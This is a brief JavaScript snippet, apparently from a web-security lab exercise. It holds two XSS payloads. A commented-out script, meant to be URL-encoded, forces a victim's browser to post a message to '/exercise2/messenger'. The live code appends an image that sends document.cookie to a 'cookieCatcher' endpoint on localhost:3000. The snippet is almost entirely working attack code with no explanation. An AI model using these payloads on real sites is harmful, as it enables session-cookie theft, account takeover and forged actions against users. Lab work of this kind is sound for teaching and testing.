// encodeURIComponent('<script>$.ajax('/exercise2/messenger', {
//     method: 'post',
//     data: {
//       to: 'sophiat',
//       body: "you're my fav"
//     }
//   })</script>')

var img = $('<img>');
img.attr('src', "http://localhost:3000/cookieCatcher?cookie=" + document.cookie)
$('body').append(img);
